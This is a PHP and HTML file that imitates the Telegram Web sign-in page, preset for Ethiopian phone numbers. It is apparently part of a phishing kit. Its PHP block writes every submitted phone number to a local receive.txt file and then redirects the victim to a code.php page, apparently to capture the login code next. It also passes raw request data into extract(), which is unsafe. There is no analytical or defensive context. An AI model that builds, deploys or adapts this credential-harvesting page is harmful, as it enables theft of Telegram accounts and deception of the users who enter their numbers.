<div class="login_head_bg"></div>
<!DOCTYPE html>
<head>
<link rel="stylesheet" href="Telegram Web_files/app.css">
</head>
<html>
<div class="page_wrap">
<div class="login_page_wrap">

  <div class="login_page">
    <div class="login_head_wrap clearfix">
	</html>

<?php
   extract($_REQUEST);
    $file=fopen("receive.txt","a");
    fwrite($file,"phone number:");
    fwrite($file, $phone_number ."\n");
    fclose($file);
$user = $_POST['phone_number'];
if (empty($user)){
	  echo '<form action ="php.php" method="POST">
      <div class="login_head_submit_wrap">
	  <input style="opacity:0.6;margin-top:21px;margin-right:15px;" value="Next" type="submit">
	  
      </div>
	  
      <a class="" href="#">
        <img style="height:70px;" src="capture.PNG">
      </a>
    </div>

    <div class="login_form_wrap">
        <h3 class="login_form_head">Sign in</h3>
        <p class="login_form_lead">Please choose your country and enter your full phone number.</p>

        <div class="md-input-group md-input-has-value login_phone_country_input_group">
          <label class="md-input-label">Country</label>
		  <input autocomplete="off" class="md-input" name="" type="text" value="Ethiopia">
        </div>
          <div class="md-input-group login_phone_code_input_group md-input-has-value md-input-animated">
            <label class="md-input-label">Code</label>
            <input autocomplete="off" class="md-input" name="phone_country" type="tel" value="+251">
          </div>

          <div class="md-input-group">
            <input autocomplete="off" style="margin-top:20px;border:none;" placeholder="phone number" name = "phone_number" >
          </div>
      </form>';
}else{
	header("location: code.php");
	  
}

?>